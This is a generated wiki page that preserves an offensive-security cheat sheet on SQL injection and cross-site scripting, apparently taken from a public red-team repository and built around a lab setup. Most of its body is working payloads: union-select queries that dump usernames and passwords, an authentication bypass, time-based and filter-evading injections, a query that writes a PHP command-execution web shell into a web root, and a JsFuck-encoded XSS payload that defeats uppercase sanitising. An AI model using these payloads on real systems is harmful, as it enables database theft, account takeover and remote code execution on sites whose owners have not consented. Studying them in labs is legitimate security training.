---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# SQL Injection & XSS Playground

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-offensive-security-cheetsheets-sql-injection-xss-playground` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/offensive-security-cheetsheets/sql-injection-xss-playground.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SQL Injection & XSS Playground](../../topics/offensive-security-experiments/sql-injection-and-xss-playground.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-offensive-security-cheetsheets-sql-injection-xss-playground |
| name | SQL Injection & XSS Playground |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/offensive-security-cheetsheets/sql-injection-xss-playground.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-11-17 20-17.gif
- Screenshot from 2018-11-17 15-51-50.png
- Screenshot from 2018-11-17 15-53-52.png
- Screenshot from 2018-11-17 15-59-39.png
- Screenshot from 2018-11-17 16-03-00.png
- Screenshot from 2018-11-17 16-16-06.png
- Screenshot from 2018-11-17 16-57-24.png
- Screenshot from 2018-11-17 19-15-16.png
- Screenshot from 2018-11-17 21-54-22.png
- Screenshot from 2018-11-17 21-55-33.png
- Screenshot from 2018-11-18 21-39-53.png
- Screenshot from 2018-11-19 22-43-46.png
_body: "---\ndescription: This is my playground for SQL injection and XSS\n---\n\n# SQL Injection & XSS Playground\n\n## Classic\
  \ SQL Injection\n\n### Union Select Data Extraction\n\n```sql\nmysql> select * from users where user_id = 1 order by 7;\
  \              \nERROR 1054 (42S22): Unknown column '7' in 'order clause'\nmysql> select * from users where user_id = 1\
  \ order by 6;\nmysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-17 15-59-39.png>)\n\n```sql\nselect * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password)\
  \ from users),3,4,5,6;\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-03-00.png>)\n\n### Authentication\
  \ Bypass\n\n```sql\nmysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99'\
  \ \n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-16-06.png>)\n\n### Second Order Injection\n\n```sql\n\
  mysql> insert into accounts (username, password, mysignature) values ('admin','mynewpass',(select user())) # 'mynewsignature');\n\
  ```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 16-57-24.png>)\n\n### Dropping a Backdoor\n\n```sql\nmysql>\
  \ select * from users where user_id = 1 union select all 1,2,3,4,\"<?php system($_REQUEST['c']);?>\",6 into outfile \"/var/www/dvwa/shell.php\"\
  \ #;\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 19-15-16.png>)\n\n### Conditional Select\n\n```sql\n\
  mysql> select * from users where user = (select concat((select if(1>0,'adm','b')),\"in\"));\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-18 21-39-53.png>)\n\n### Bypassing Whitespace Filtering\n\n```sql\nmysql> select * from users where user_id\
  \ = 1/**/union/**/select/**/all/**/1,2,3,4,5,6;\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-19 22-43-46.png>)\n\
  \n## Time Based SQL Injection\n\n### Sleep Invokation\n\n```sql\nmysql> select * from users where user_id = 1 or (select\
  \ sleep(1)+1);\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 15-51-50.png>)\n\n```sql\nselect * from users\
  \ where user_id = 1 union select 1,2,3,4,5,sleep(1);\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 15-53-52.png>)\n\
  \n```\n```\n\n## XSS\n\n![](<../../.gitbook/assets/Peek 2018-11-17 20-17.gif>)\n\n### Strtoupper Bypass\n\nSay we have the\
  \ following PHP code that takes `name` as a user supplied parameter:\n\n```php\n<?php\n        $input=$_GET['name'];\n \
  \       $sanitized=strtoupper(htmlspecialchars($input));   \n        echo '<form action=\"\">';\n        echo \"First name:\
  \ <input type='text' name='name' value='\".$sanitized.\"'><br>\";\n        echo \"<input type='submit' value='Submit form'></form>\"\
  ;\n        echo \"</HTML></body>\";\n?>\n```\n\nLine 3 is vulnerable to XSS, and we can break out of the input with a single\
  \ quote `'`:\n\n```php\n$sanitized=strtoupper(htmlspecialchars($input));   \n```\n\nFor example, if we set the `name` parameter\
  \ to the value of  `a'`, we get:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 21-54-22.png>)\n\nNote that the\
  \ `a` got converted to a capital `A` and this is due to the `strtoupper` function being called on our input. What this means\
  \ is that any ascii letters in our JavaScript payload will get converted to uppercase and become invalid and will not execute\
  \ (i.e`alert() != ALERT()`).\n\nTo bypass this constraint, we can encode our payload using JsFuck, which eliminates all\
  \ the letters from the payload and leaves us with this:\n\n```php\nA' onmouseover='[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()'\n\
  ```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-17 21-55-33.png>)\n\n## References\n\n{% embed url=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\"\
  \ %}\n\n{% embed url=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\" %}\n\n{% embed\
  \ url=\"http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html\" %}\n\
  \n{% embed url=\"https://www.youtube.com/watch?v=Rqt_BgG5YyI\" %}"
_relative_path: offensive-security-experiments/offensive-security-cheetsheets/sql-injection-xss-playground.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/offensive-security-cheetsheets/sql-injection-xss-playground.md
````
